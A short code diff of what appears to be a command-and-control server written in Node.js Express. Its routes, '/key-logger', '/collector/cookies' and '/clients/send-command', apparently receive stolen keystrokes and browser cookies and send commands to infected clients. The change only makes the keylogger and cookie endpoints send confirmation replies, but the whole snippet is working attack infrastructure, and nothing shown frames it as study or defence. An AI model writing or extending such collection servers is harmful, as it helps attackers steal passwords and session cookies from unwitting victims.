@@ -55,12 +55,12 @@ app.post(`/clients/send-command`, (req, res) => {
 // POST request handler
 app.post('/key-logger', (req, res) => {
     console.log(req.body); // Logs the request body to the console
-    res.status(200)
+    return res.status(200).send('Key logs received')
 });
 
 app.post('/collector/cookies', (req, res) => {
     console.log(req.body)
-    res.status(200)
+    return res.status(200).send('Cookies received')
 })
 
 app.post('/send-command', (req, res) => {
